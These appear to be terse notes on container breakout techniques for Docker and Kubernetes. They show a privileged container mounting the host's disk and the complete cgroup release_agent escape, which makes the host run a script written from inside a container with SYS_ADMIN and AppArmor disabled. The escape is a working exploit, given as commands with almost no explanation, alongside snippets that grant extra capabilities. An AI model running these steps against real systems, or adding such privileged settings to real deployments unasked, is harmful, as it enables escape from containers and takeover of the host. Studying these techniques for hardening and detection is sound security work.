kubectl exec --stdin --tty nginx-deployment-74b89459bc-g26fc  -- /bin/bash





securityContext:
  capabilities:
    add: ["NET_ADMIN", "SYS_TIME"]

-----

docker run --rm -it --privileged ubuntu:18.04 bash
mkdir -p /mnt/hole
mount /dev/nvme0n1p1 /mnt/hole


# On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
 
# In the container
'''
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
 
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
 
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
 
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
more /output
'''
